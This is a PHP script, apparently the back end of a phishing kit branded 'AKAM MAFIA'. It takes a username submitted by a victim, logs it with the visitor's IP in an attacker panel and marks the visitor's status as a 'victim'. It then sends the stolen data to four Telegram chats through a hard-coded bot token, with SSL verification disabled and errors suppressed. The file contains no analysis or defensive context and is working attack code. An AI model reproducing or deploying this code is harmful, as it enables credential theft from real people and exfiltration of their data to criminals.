<?php
// Desactiva errores visibles
error_reporting(0);

// Prueba ambas rutas por si acaso
if(file_exists('../lib/funciones.php')){
    require_once('../lib/funciones.php');
} else {
    require_once('../panel/lib/funciones.php');
}

date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$usuario = isset($_POST['usr']) ? $_POST['usr'] : 'No detectado'; 

if ($usuario != 'No detectado') {
    // 1. Guardar en el panel y poner estado 1
    if (function_exists('actualizar_registro')) {
        actualizar_registro($ip, "USUARIO", $usuario); 
    }
    
    // Forzamos el estado a 1 para que el sistema sepa que hay alguien nuevo
    if (function_exists('actualizar_estado_victima')) {
        actualizar_estado_victima($ip, "1");
    }

    // 2. Configuración del Bot 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 (Los 4 IDs)
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = ["8114050673", "8518977918", "8638340940", "8645545892"]; 

    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - NUEVO ACCESO</b> ⭐\n\n";
    $mensaje .= "👤 <b>USUARIO:</b> <code>" . $usuario . "</code>\n";
    $mensaje .= "📍 <b>IP:</b> <code>" . $ip . "</code>\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = ['chat_id' => $id, 'text' => $mensaje, 'parse_mode' => 'HTML'];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}
echo "ok"; // Esto es vital para que el JS sepa que terminó
?>
